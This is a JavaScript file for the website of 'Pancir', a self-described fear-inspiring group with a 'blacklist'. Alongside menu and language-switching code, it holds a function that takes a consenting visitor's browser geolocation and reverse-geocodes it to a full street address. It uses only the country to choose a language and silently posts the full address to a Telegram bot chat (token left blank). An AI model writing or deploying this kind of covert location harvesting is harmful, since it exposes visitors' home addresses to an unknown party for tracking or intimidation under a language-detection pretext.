const burger = document.querySelector('.burger');
const menuList = document.querySelector('.menu-list');

burger.addEventListener('click', () => {
    menuList.classList.toggle('active');
});

window.onload = function() {
    document.getElementById('consentModal').style.display = "block";
};

document.getElementById('closeModal').onclick = function() {
    document.getElementById('consentModal').style.display = "none";
};

document.getElementById('acceptConsent').onclick = function() {
    document.getElementById('consentModal').style.display = "none";
    localStorage.setItem('geoConsent', 'accepted'); 
    getLocationAndLanguage(); 
};

document.getElementById('declineConsent').onclick = function() {
    alert("Вы отказались от сбора данных.");
    document.getElementById('consentModal').style.display = "none";
    localStorage.setItem('geoConsent', 'declined');   
};

async function getLocationAndLanguage() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const { latitude, longitude } = position.coords;

            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1&accept-language=ru`);
            const data = await response.json();

            const address = data.display_name; 
            const country = data.address.country; 
            const language = (country === "Россия") ? "ru" : "en"; 

            changeLanguage(language);
            sendDataToTelegram(address); 
        });
    } else {
        alert("Geolocation is not supported by this browser.");
    }
}


function changeLanguage(lang) {
    const texts = {
        en: {
            title: "Pancir",
            description: "Powerful, mysterious group, strategists influencing the world, instilling fear.",
            menu: {
                about: "About us",
                projects: "Our projects",
                services: "Services",
                blacklist: "Blacklist"
            },
            about: "Who are Pancir?",
            aboutContent: "The Pancir group is a mysterious and powerful force that evokes both interest and fear. They possess significant resources that allow them to act independently and effectively. Members of the group may be highly educated and strategically minded, making their actions well thought out. Their location and numbers remain unknown, creating an atmosphere of anxiety. The motives and goals of the group are unclear, making their actions potentially dangerous. The group may have connections with various structures, enhancing their positions. Thus, the Pancir is a mysterious force capable of exerting significant influence on society.",
            target: "What are our Target?",
            targetContent: "The goals and motivations of the Pancir group may be diverse and depend on their ideology and strategy. Here are several possible objectives for which they might fight: Power and influence: The Pancir may seek to expand their influence in the political or economic sphere to control key resources or participate in decision-making. Protection of interests: The group may act in the interests of a specific group of people, corporate interests, or even a nation, defending their rights and resources. Ideological goals: They may have ideological foundations, such as fighting for certain social, cultural, or religious values, which could lead to conflicts with other groups. Economic gain: The group may participate in the shadow economy, seeking profit through illegal or semi-legal activities. Social change: The Pancir may aim for reforms and changes in society, trying to influence public opinion and bring certain issues to the forefront. Network building: They may attempt to create a network of allies and supporters to strengthen their positions and capabilities. These goals may overlap, and depending on the circumstances, the Pancir may adapt their strategy to achieve their interests.",
            fear: "Should we be afraid?",
            fearContent: "We are an independent group of individuals who work strictly in our own interests.",
        },
        ru: {
            title: "Pancir",
            description: "Мощная, таинственная группа, стратеги, влияющие на мир, внушающие страх.",
            menu: {
                about: "О нас",
                projects: "Наши проекты",
                services: "Услуги",
                blacklist: "Черный список"
            },
            about: "Кто такие Панцирь?",
            aboutContent: "Группа Pancir — таинственная и могущественная сила, вызывающая как интерес, так и страх. Они обладают значительными ресурсами, которые позволяют им действовать независимо и эффективно. Члены группы могут быть высокообразованными и стратегически мыслящими, что делает их действия хорошо продуманными. Их местоположение и численность остаются неизвестными, что создает атмосферу тревоги. Мотивы и цели группы неясны, что делает их действия потенциально опасными. Группа может иметь связи с различными структурами, усиливая свои позиции. Таким образом, Pancir — таинственная сила, способная оказывать значительное влияние на общество.",
            target: "Каковы наши цели?",
            targetContent: "Цели и мотивы группы Pancir могут быть разнообразными и зависеть от их идеологии и стратегии. Вот несколько возможных целей, за которые они могут бороться: Власть и влияние: Pancir может стремиться расширить свое влияние в политической или экономической сфере, чтобы контролировать ключевые ресурсы или участвовать в принятии решений. Защита интересов: Группа может действовать в интересах определенной группы людей, корпоративных интересов или даже нации, защищая их права и ресурсы. Идеологические цели: У них могут быть идеологические основы, такие как борьба за определенные социальные, культурные или религиозные ценности, что может привести к конфликтам с другими группами. Экономическая выгода: Группа может участвовать в теневой экономике, стремясь получить прибыль за счет незаконной или полулегальной деятельности. Социальные изменения: Pancir может стремиться к реформам и изменениям в обществе, пытаясь повлиять на общественное мнение и вынести определенные вопросы на первый план. Создание сетей: Они могут попытаться создать сеть союзников и сторонников, чтобы укрепить свои позиции и возможности. Эти цели могут пересекаться, и в зависимости от обстоятельств Pancir может адаптировать свою стратегию для достижения своих интересов.",
            fear: "Стоит ли нам бояться?",
            fearContent: "Мы — независимая группа людей, работающих исключительно в своих интересах.",
        }
    };

    document.querySelector('.background-content h1').textContent = texts[lang].title;
    document.querySelector('.background-content p').textContent = texts[lang].description;


    document.querySelector('.menu-list .menu-item:nth-child(1) a').textContent = texts[lang].menu.about;
    document.querySelector('.menu-list .menu-item:nth-child(2) a').textContent = texts[lang].menu.projects;
    document.querySelector('.menu-list .menu-item:nth-child(3) a').textContent = texts[lang].menu.services;
    document.querySelector('.menu-list .menu-item:nth-child(4) a').textContent = texts[lang].menu.blacklist;

    document.querySelector('#about-us-anchor').textContent = texts[lang].about;
    document.querySelector('.text-pancir p:nth-of-type(1)').textContent = texts[lang].aboutContent;
    document.querySelector('.text-pancir h2:nth-of-type(2)').textContent = texts[lang].target;
    document.querySelector('.text-pancir p:nth-of-type(2)').textContent = texts[lang].targetContent;
    document.querySelector('.text-pancir h2:nth-of-type(3)').textContent = texts[lang].fear;
    document.querySelector('.text-pancir p:nth-of-type(3)').textContent = texts[lang].fearContent;
}

async function sendDataToTelegram(address) {
    const token = ''; 
    const chatId = ''; 
    const message = `Пользователь по адресу: ${address}`;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    });
}
